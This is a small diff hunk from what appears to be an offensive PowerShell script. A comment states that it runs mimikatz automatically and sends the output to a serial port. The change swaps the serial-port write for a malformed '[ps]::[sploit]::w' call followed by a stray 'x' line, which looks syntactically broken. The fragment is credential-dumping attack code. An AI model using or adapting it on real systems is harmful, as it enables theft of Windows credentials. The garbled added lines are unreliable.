@@ -2751,4 +2751,5 @@ Main
 }
 #automaticaly execute mimikatz and send output to serial port
 $mimikat = Invoke-Mimikatz
-$port.WriteLine($mimikat)
+[ps]::[sploit]::w($mimikat)
+x
